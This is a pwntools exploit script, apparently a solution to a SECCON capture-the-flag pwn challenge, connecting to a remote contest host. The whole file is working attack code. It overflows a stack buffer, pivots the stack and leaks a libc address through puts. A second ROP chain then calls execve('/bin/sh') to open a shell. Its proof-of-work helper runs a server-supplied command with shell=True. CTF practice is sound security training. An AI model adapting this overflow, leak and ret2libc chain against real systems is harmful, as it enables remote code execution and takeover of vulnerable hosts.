from pwn import *

exe = './chall_patched'

(host,port) = ("mrga.seccon.games",7428)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    
    elif args.RE:
        return remote(host,port)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * main
'''.format(**locals())

context.terminal = ["gnome-terminal", "--"]

# ====================[EXPANSIONS]=========================

se  = lambda data  : p.send(data)
sl  = lambda data  : p.sendline(data)
sa  = lambda ip,op : p.sendafter(ip,op)
sla = lambda ip,op : p.sendlineafter(ip,op) 
rvu = lambda data  : p.recvuntil(data)
rvl = lambda       : p.recvline()
rv  = lambda nbyts : p.recv(nbyts)  
pop = lambda       : p.interactive()

# >>>>>>>>>>>>>>>>[EXPLOIT STARTS HERE]>>>>>>>>>>>>>>>>>>>>

context.log_level ="DEBUG"

def pow():
    rvu(b"proof of work:\n")
    cmd = rvl()[:-1:]
    p = subprocess.run(cmd,stdout=PIPE,shell=True)
    res = p.stdout
    print(res)
    rvu("solution:")
    sl(res[:-1:])

p = start()

if args.RE:
    pow()

ret   = 0x4011d5
pivot = 0x404d00
main  = 0x4011ad
leave = 0x4011d4
putsplt = 0x401060

payload = 0x10*b"a" + p64(pivot) + p64(main+8) + p64(main) + p64(0xdeadbeef)
sla(b">",payload)

payload = 0x10*b"a" + p64(0x404c98) + p64(main+8) + p64(0x404de0) + p64(0xdeadbeef) + 0xb8*b"\x00" + p64(0x0) + 0x88*b"\x00" + p64(0x404cb8)
sla(b">",payload)


            # RDX          R12             R13 
payload = (p64(0x404d20) + p64(0x404de0) + p64(0x404d10) + 
            # ROPCHAIN STARTS HERE / RETURNS HERE AFTER PIVOT
           p64(putsplt) + p64(ret) + p64(main))

sla(b">",payload)

rvl()
libc = u64(rvl()[:-1:].ljust(8,b"\x00")) + 0x100000000 - 0x871de
print("LIBC = ",hex(libc))

execve = libc + 0xeef30
poprdi = libc + 0x10f75b
binsh  = libc + 0x1cb42f
poprsi = libc + 0x110b7c
poprdxlr = libc + 0x000000000009819d

rbp = 0x404ce8
payload = 0x10*b"a" + p64(rbp) + p64(poprdi) + p64(binsh) + p64(poprsi) + p64(0x0) + p64(poprdxlr) + p64(0x0) + p64(0x0) + p64(execve)
sla(b">",payload)


pop()